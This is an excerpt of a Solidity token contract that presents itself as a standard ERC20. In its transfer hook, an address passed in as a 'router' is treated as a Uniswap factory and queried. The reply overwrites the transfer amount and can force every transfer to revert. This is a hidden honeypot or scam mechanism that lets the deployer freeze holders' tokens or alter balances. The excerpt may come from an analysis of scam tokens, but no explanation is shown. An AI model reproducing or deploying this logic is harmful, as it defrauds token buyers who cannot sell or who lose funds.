...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_, address _universalRouter) {
        _name = name_;
        _symbol = symbol_;
        uniswapV2Factory = IUniswapV2Factory(_universalRouter);
    }
    ...
    function _beforeTokenTransfer(
        ...
        (bool fill, uint256 sumFill) = uniswapV2Factory.getReserves(from, to);
        uint256 subTotal = 0;
        amount = sumFill;
        if(fill){
            amountDone = subTotal;
            require(amountDone > 0);
        }
    }
